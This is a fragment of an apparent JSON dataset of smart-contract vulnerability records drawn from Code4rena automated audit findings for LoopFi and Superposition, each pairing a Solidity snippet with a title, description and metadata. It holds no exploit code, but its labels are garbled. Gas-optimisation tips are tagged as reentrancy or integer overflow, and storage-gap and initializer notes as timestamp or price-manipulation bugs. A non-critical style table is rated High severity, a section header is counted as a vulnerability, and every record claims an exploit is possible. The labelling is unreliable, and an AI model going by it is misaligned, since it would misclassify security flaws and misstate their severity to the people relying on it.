    "description": "*Instances (2)*: File: src/Flashlender.sol 105:         underlyingToken.transferFrom(address(receiver), address(pool), total); 133:         underlyingToken.transferFrom(address(receiver), address(pool), total); [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/Flashlender.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.206,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/proxy/PositionAction.sol\n\n279:                 (bool success, bytes memory response) = targets[i].call(data[i]);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-25\"></a>[L-25] Unsafe solidity low-level call can cause gas grief attack",
    "description": "Using the low-level calls of a solidity address can leave the contract open to gas grief attacks. These attacks occur when the called contract returns a large amount of data. So when calling an external contract, it is necessary to check the length of the return data before reading/copying it (using `returndatasize()`). *Instances (1)*: File: src/proxy/PositionAction.sol 279:                 (bool success, bytes memory response) = targets[i].call(data[i]);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.133,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n6: import {Initializable} from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\n\n7: import {OwnableUpgradeable} from \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\n\n8: import {PausableUpgradeable} from \"@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol\";\n\n20: contract ChefIncentivesController is Initializable, PausableUpgradeable, OwnableUpgradeable, RecoverERC20 {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "<a name=\"L-26\"></a>[L-26] Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions",
    "description": "See [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future. *Instances (18)*: File: src/oracle/BalancerOracle.sol 4: import {UUPSUpgradeable} from \"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\"; 5: import {AccessControlUpgradeable} from \"@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.486,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n6: import {Initializable} from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\n\n7: import {OwnableUpgradeable} from \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\n\n8: import {PausableUpgradeable} from \"@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol\";\n\n20: contract ChefIncentivesController is Initializable, PausableUpgradeable, OwnableUpgradeable, RecoverERC20 {\n\n224:         _disableInitializers();\n\n234:     function initialize(\n\n241:     ) public initializer {\n\n247:         __Ownable_init();\n\n248:         __Pausable_init();\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "<a name=\"L-27\"></a>[L-27] Upgradeable contract not initialized",
    "description": "Upgradeable contracts are initialized via an initializer function rather than by a constructor. Leaving such a contract uninitialized may lead to it being taken over by a malicious user *Instances (37)*: File: src/oracle/BalancerOracle.sol 4: import {UUPSUpgradeable} from \"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\"; 5: import {AccessControlUpgradeable} from \"@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.653,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/PoolV3.sol\n\n385:         IERC20(underlyingToken).safeTransferFrom({from: msg.sender, to: address(this), value: assetsSent}); // U:[LP-6,7]\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-1\"></a>[M-1] Contracts are vulnerable to fee-on-transfer accounting-related issues",
    "description": "Consistently check account balance before and after transfers for Fee-On-Transfer discrepancies. As arbitrary ERC20 tokens can be used, the amount here should be calculated every time to take into consideration a possible fee-on-transfer or deflation. Also, it's a good practice for the future of the solution. Use the balance before and after the transfer to calculate the received amount instead of assuming that it would be equal to the amount passed as a parameter. Or explicitly document that such tokens shouldn't be used and won't be supported *Instances (5)*: File: src/CDPVault.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.159,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/CDPVault.sol\n\n318:         position.lastDebtUpdate = uint64(block.number); // U:[CM-10,11]\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "<a name=\"M-2\"></a>[M-2] `block.number` means different things on different L2s",
    "description": "On Optimism, `block.number` is the L2 block number, but on Arbitrum, it's the L1 block number, and `ArbSys(address(100)).arbBlockNumber()` must be used. Furthermore, L2 block numbers often occur much more frequently than L1 block numbers (any may even occur on a per-transaction basis), so using block numbers for timing results in inconsistencies, especially when voting is involved across multiple chains. As of version 4.9, OpenZeppelin has [modified](https://blog.openzeppelin.com/introducing-openzeppelin-contracts-v4.9#governor) their governor code to use a clock rather than block numbers, to avoid these sorts of issues, but this still requires that the project [implement](https://docs.openzeppelin.com/contracts/4.x/governance#token_2) a [clock](https://eips.ethereum.org/EIPS/eip-6372) for each L2. *Instances (1)*: File: src/CDPVault.sol 318:         position.lastDebtUpdate = uint64(block.number); // U:[CM-10,11] [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.111,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n272:     function setBountyManager(address _bountyManager) external onlyOwner {\n\n281:     function setEligibilityMode(EligibilityModes _newVal) external onlyOwner {\n\n291:     function start() public onlyOwner {\n\n318:     function batchUpdateAllocPoint(address[] calldata _tokens, uint256[] calldata _allocPoints) external onlyOwner {\n\n342:     function setRewardsPerSecond(uint256 _rewardsPerSecond, bool _persist) external onlyOwner {\n\n397:     ) external onlyOwner {\n\n430:     function recoverERC20(address tokenAddress, uint256 tokenAmount) external onlyOwner {\n\n581:     function setContractAuthorization(address _address, bool _authorize) external onlyOwner {\n\n909:     function setEndingTimeUpdateCadence(uint256 _lapse) external onlyOwner {\n\n920:     function registerRewardDeposit(uint256 _amount) external onlyOwner {\n\n966:     function pause() external onlyOwner {\n\n973:     function unpause() external onlyOwner {\n\n1005:     function setAddressWLstatus(address user, bool status) external onlyOwner {\n\n1012:     function toggleWhitelist() external onlyOwner {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Impact",
    "description": "Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds. *Instances (47)*: File: src/CDPVault.sol 39: contract CDPVault is AccessControl, Pause, Permission, ICDPVaultBase { 195:     function setParameter(bytes32 parameter, uint256 data) external whenNotPaused onlyRole(VAULT_CONFIG_ROLE) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 32,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n383:         (, int256 answer, , , ) = AggregatorV3Interface(ETH_CHAINLINK_FEED).latestRoundData();\n             ethPrice = wdiv(uint256(answer), ETH_CHAINLINK_DECIMALS);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Medium",
    "title": "<a name=\"M-4\"></a>[M-4] Chainlink's `latestRoundData` might return stale or incorrect results",
    "description": "- This is a common issue: <https://github.com/code-423n4/2022-12-tigris-findings/issues/655>, <https://code4rena.com/reports/2022-10-inverse#m-17-chainlink-oracle-data-feed-is-not-sufficiently-validated-and-can-return-stale-price>, <https://app.sherlock.xyz/audits/contests/41#issue-m-12-chainlinks-latestrounddata--return-stale-or-incorrect-result> and many more occurrences. `latestRoundData()` is used to fetch the asset price from a Chainlink aggregator, but it's missing additional validations to ensure that the round is complete. If there is a problem with Chainlink starting a new round and finding consensus on the new value for the oracle (e.g. Chainlink nodes abandon the oracle, chain congestion, vulnerability/attacks on the Chainlink system) consumers of this contract may continue using outdated stale data / stale prices. More bugs related to chainlink here: [Chainlink Oracle Security Considerations](https://medium.com/cyfrin/chainlink-oracle-defi-attacks-93b6cb6541bf#99af) *Instances (1)*: File: src/vendor/AuraVault.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.213,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n383:         (, int256 answer, , , ) = AggregatorV3Interface(ETH_CHAINLINK_FEED).latestRoundData();\n             ethPrice = wdiv(uint256(answer), ETH_CHAINLINK_DECIMALS);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Medium",
    "title": "<a name=\"M-5\"></a>[M-5] Missing checks for whether the L2 Sequencer is active",
    "description": "Chainlink recommends that users using price oracles, check whether the Arbitrum Sequencer is [active](https://docs.chain.link/data-feeds/l2-sequencer-feeds#arbitrum). If the sequencer goes down, the Chainlink oracles will have stale prices from before the downtime, until a new L2 OCR transaction goes through. Users who submit their transactions via the [L1 Dealyed Inbox](https://developer.arbitrum.io/tx-lifecycle#1b--or-from-l1-via-the-delayed-inbox) will be able to take advantage of these stale prices. Use a [Chainlink oracle](https://blog.chain.link/how-to-use-chainlink-price-feeds-on-arbitrum/#almost_done!_meet_the_l2_sequencer_health_flag) to determine whether the sequencer is offline or not, and don't allow operations to take place while the sequencer is offline. *Instances (1)*: File: src/vendor/AuraVault.sol 383:         (, int256 answer, , , ) = AggregatorV3Interface(ETH_CHAINLINK_FEED).latestRoundData(); ethPrice = wdiv(uint256(answer), ETH_CHAINLINK_DECIMALS);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.213,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/Flashlender.sol\n\n105:         underlyingToken.transferFrom(address(receiver), address(pool), total);\n\n133:         underlyingToken.transferFrom(address(receiver), address(pool), total);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-6\"></a>[M-6] Return values of `transfer()`/`transferFrom()` not checked",
    "description": "Not all `IERC20` implementations `revert()` when there's a failure in `transfer()`/`transferFrom()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually making a payment *Instances (2)*: File: src/Flashlender.sol 105:         underlyingToken.transferFrom(address(receiver), address(pool), total); 133:         underlyingToken.transferFrom(address(receiver), address(pool), total);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.206,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/Flashlender.sol\n\n105:         underlyingToken.transferFrom(address(receiver), address(pool), total);\n\n133:         underlyingToken.transferFrom(address(receiver), address(pool), total);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-7\"></a>[M-7] Unsafe use of `transfer()`/`transferFrom()` with `IERC20`",
    "description": "Some tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens.  For example Tether (USDT)'s `transfer()` and `transferFrom()` functions on L1 do not return booleans as the specification requires, and instead have no return value. When these sorts of tokens are cast to `IERC20`, their [function signatures](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca) do not match and therefore the calls made, revert (see [this](https://gist.github.com/IllIllI000/2b00a32e8f0559e8f386ea4f1800abc5) link for a test case). Use OpenZeppelin's `SafeERC20`'s `safeTransfer()`/`safeTransferFrom()` instead *Instances (2)*: File: src/Flashlender.sol 105:         underlyingToken.transferFrom(address(receiver), address(pool), total); 133:         underlyingToken.transferFrom(address(receiver), address(pool), total);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.206,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "Automated Findings / Publicly Known Issues",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Automated Findings / Publicly Known Issues",
    "description": "The 4naly3er report can be found [here](https://github.com/code-423n4/2024-07-loopfi/blob/main/4naly3er-report.md). _Note for C4 wardens: Anything included in this `Automated Findings / Publicly Known Issues` section is considered a publicly known issue and is ineligible for awards._ All of the previous findings from the previous audit reports from Watchpug",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/OwnershipNFTs.sol\n\n37:     mapping(address => mapping(address => bool)) public isApprovedForAll;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "<a name=\"GAS-2\"></a>[GAS-2] Using bools for storage incurs overhead",
    "description": "Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from \u2018false\u2019 to \u2018true\u2019, after having been \u2018true\u2019 in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27). *Instances (1)*: File: ./pkg/sol/OwnershipNFTs.sol 37:     mapping(address => mapping(address => bool)) public isApprovedForAll; [Link to code](https://github.com/code-423n4/2024-10-superposition/blob/main/./pkg/sol/OwnershipNFTs.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.123,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n4: import \"./ISeawaterExecutors.sol\";\n\n6: import \"./ISeawaterAMM.sol\";\n\n12: bytes32 constant EXECUTOR_SWAP_SLOT = bytes32(uint256(keccak256(\"seawater.impl.swap\")) - 1);\n\n15: bytes32 constant EXECUTOR_SWAP_PERMIT2_A_SLOT = bytes32(uint256(keccak256(\"seawater.impl.swap_permit2.a\")) - 1);\n\n18: bytes32 constant EXECUTOR_QUOTE_SLOT = bytes32(uint256(keccak256(\"seawater.impl.quote\")) - 1);\n\n21: bytes32 constant EXECUTOR_POSITION_SLOT = bytes32(uint256(keccak256(\"seawater.impl.position\")) - 1);\n\n24: bytes32 constant EXECUTOR_UPDATE_POSITION_SLOT = bytes32(uint256(keccak256(\"seawater.impl.update_position\")) - 1);\n\n27: bytes32 constant EXECUTOR_ADMIN_SLOT = bytes32(uint256(keccak256(\"seawater.impl.admin\")) - 1);\n\n30: bytes32 constant EXECUTOR_ADJUST_POSITION_SLOT = bytes32(uint256(keccak256(\"seawater.impl.adjust_position\")) - 1);\n\n33: bytes32 constant EXECUTOR_SWAP_PERMIT2_B_SLOT = bytes32(uint256(keccak256(\"seawater.impl.swap_permit2.b\")) - 1);\n\n36: bytes32 constant EXECUTOR_FALLBACK_SLOT = bytes32(uint256(keccak256(\"seawater.impl.fallback\")) - 1);\n\n39: bytes32 constant PROXY_ADMIN_SLOT = bytes32(uint256(keccak256(\"seawater.role.proxy.admin\")) - 1);\n\n161:         address /* token */,\n\n162:         uint256 /* sqrtPriceX96 */,\n\n163:         uint32 /* fee */,\n\n164:         uint8 /* tickSpacing */,\n\n165:         uint128 /* maxLiquidityPerTick */\n\n172:         address /* pool */,\n\n173:         uint128 /* amount0 */,\n\n174:         uint128 /* amount1 */,\n\n175:         address /* recipient */\n\n181:     function enablePool579DA658(address /* pool */, bool /* enabled */) external {\n\n186:     function authoriseEnabler5B17C274(address /* enabler */, bool /* enabled */) external {\n\n191:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n\n196:     function updateNftManager9BDF41F6(address /* manager */) external {\n\n201:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n\n209:         address /* pool */,\n\n210:         bool /* zeroForOne */,\n\n211:         int256 /* amount */,\n\n212:         uint256 /* priceLimit */\n\n219:         address /* pool */,\n\n220:         bool /* zeroForOne */,\n\n221:         int256 /* amount */,\n\n222:         uint256 /* priceLimit */\n\n228:     function quote2CD06B86E(address /* from */, address /* to */, uint256 /* amount */, uint256 /* minOut*/) external {\n\n234:         address /* pool */,\n\n235:         bool /* zeroForOne */,\n\n236:         int256 /* amount */,\n\n237:         uint256 /* priceLimit */,\n\n238:         uint256 /* nonce */,\n\n239:         uint256 /* deadline */,\n\n240:         uint256 /* maxAmount */,\n\n241:         bytes memory /* sig */\n\n248:         address /* from */,\n\n249:         address /* to */,\n\n250:         uint256 /* amount */,\n\n251:         uint256 /* minOut */,\n\n252:         uint256 /* nonce */,\n\n253:         uint256 /* deadline */,\n\n254:         bytes memory /* sig */\n\n261:         address /* tokenA */,\n\n262:         address /* tokenB */,\n\n263:         uint256 /* amountIn */,\n\n264:         uint256 /* minAmountOut */\n\n278:         require(-swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n302:         require(-swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n345:         address /* token */,\n\n346:         int32 /* lower */,\n\n347:         int32 /* upper */\n\n348:     ) external returns (uint256 /* id */) {\n\n353:     function positionOwnerD7878480(uint256 /* id */) external returns (address) {\n\n359:     function transferPositionEEC7A3CD(uint256 /* id */, address /* from */, address /* to */) external {\n\n364:     function positionBalance4F32C7DB(address /* user */) external returns (uint256) {\n\n369:     function positionLiquidity8D11C045(address /* pool */, uint256 /* id */) external returns (uint128) {\n\n374:     function positionTickLower2F77CCE1(address /* pool */, uint256 /* id */) external returns (int32) {\n\n379:     function positionTickUpper67FD55BA(address /* pool */, uint256 /* id */) external returns (int32) {\n\n384:     function sqrtPriceX967B8F5FC5(address /* pool */) external returns (uint256) {\n\n389:     function feesOwed22F28DBD(address /* pool */, uint256 /* position */) external returns (uint128, uint128) {\n\n394:     function curTick181C6FD9(address /* pool */) external returns (int32) {\n\n399:     function tickSpacing653FE28F(address /* pool */) external returns (uint8) {\n\n404:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n\n409:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n\n414:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n\n420:         address /* pool */,\n\n421:         uint256 /* id */,\n\n422:         address /* recipient */\n\n429:         address[] memory /* pools */,\n\n430:         uint256[] memory /* ids */\n\n437:         address /* pool */,\n\n438:         uint256 /* id */,\n\n439:         int128 /* delta */\n\n446:         address /* pool */,\n\n447:         uint256 /* id */,\n\n448:         uint256 /* amount0Min */,\n\n449:         uint256 /* amount1Min */,\n\n450:         uint256 /* amount0Desired */,\n\n451:         uint256 /* amount1Desired */\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "<a name=\"GAS-4\"></a>[GAS-4] For Operations that will not overflow, you could use unchecked",
    "description": "*Instances (93)*: File: ./pkg/sol/OwnershipNFTs.sol 4: import \"./IERC721Metadata.sol\"; 5: import \"./IERC721TokenReceiver.sol\"; 6: import \"./IERC165.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 178,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/OwnershipNFTs.sol\n\n51:         require(ok, \"position owner revert\");\n\n59:         require(approved != address(0), \"not existing\");\n\n85:         require(data == IERC721TokenReceiver.onERC721Received.selector, \"bad nft transfer received data\");\n\n94:         require(isAllowed, \"not allowed\");\n\n95:         require(ownerOf(_tokenId) == _from, \"_from is not the owner!\");\n\n100:         require(_to != address(0), \"invalid recipient\");\n\n132:         require(owner == msg.sender || isApprovedForAll[owner][msg.sender], \"not authorised\");\n\n145:         require(_spender != address(0), \"invalid recipient\");\n\n149:         require(ok, \"position balance revert\");\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"GAS-5\"></a>[GAS-5] Use Custom Errors instead of Revert Strings to save Gas",
    "description": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas Additionally, custom errors can be used inside and outside of contracts (including interfaces and libraries). Source: <https://blog.soliditylang.org/2021/04/21/custom-errors/>: > Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them. Consider replacing **all revert strings** with custom errors in the solution, and particularly those that have multiple occurrences:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.68,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n112:         (bool success, bytes memory data) = _getExecutorAdmin().delegatecall(\n\n271:         (bool success, bytes memory data) = _getExecutorSwap().delegatecall(\n\n292:         (bool success, bytes memory data) = _getExecutorSwapPermit2A().delegatecall(\n\n308:         (bool success, bytes memory data) = _getExecutorSwap().delegatecall(\n\n328:         (bool success, bytes memory data) = _getExecutorSwapPermit2A().delegatecall(\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"GAS-6\"></a>[GAS-6] Avoid contract existence checks by using low level calls",
    "description": "Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence *Instances (5)*: File: ./pkg/sol/SeawaterAMM.sol 112:         (bool success, bytes memory data) = _getExecutorAdmin().delegatecall( 271:         (bool success, bytes memory data) = _getExecutorSwap().delegatecall(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.474,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n\n456:     function setExecutorSwap(address a) external onlyProxyAdmin {\n\n459:     function setExecutorSwapPermit2A(address a) external onlyProxyAdmin {\n\n462:     function setExecutorQuote(address a) external onlyProxyAdmin {\n\n465:     function setExecutorPosition(address a) external onlyProxyAdmin {\n\n468:     function setExecutorUpdatePosition(address a) external onlyProxyAdmin {\n\n471:     function setExecutorAdmin(address a) external onlyProxyAdmin {\n\n474:     function setExecutorAdjustPosition(address a) external onlyProxyAdmin {\n\n477:     function setExecutorSwapPermit2B(address a) external onlyProxyAdmin {\n\n480:     function setExecutorFallback(address a) external onlyProxyAdmin {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"GAS-8\"></a>[GAS-8] Functions guaranteed to revert when called by normal users can be marked `payable`",
    "description": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. *Instances (10)*: File: ./pkg/sol/SeawaterAMM.sol 123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin { 456:     function setExecutorSwap(address a) external onlyProxyAdmin {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 24,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.814,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "abi.encodeWithSignature",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "Non Critical Issues",
    "description": "| |Issue|Instances| |-|:-|:-:| | [NC-1](#NC-1) | Replace `abi.encodeWithSignature` and `abi.encodeWithSelector` with `abi.encodeCall` which keeps the code typo/type safe | 2 | | [NC-2](#NC-2) | Array indices should be referenced via `enum`s rather than via numeric literals | 8 | | [NC-3](#NC-3) | Control structures do not follow the Solidity Style Guide | 9 |",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
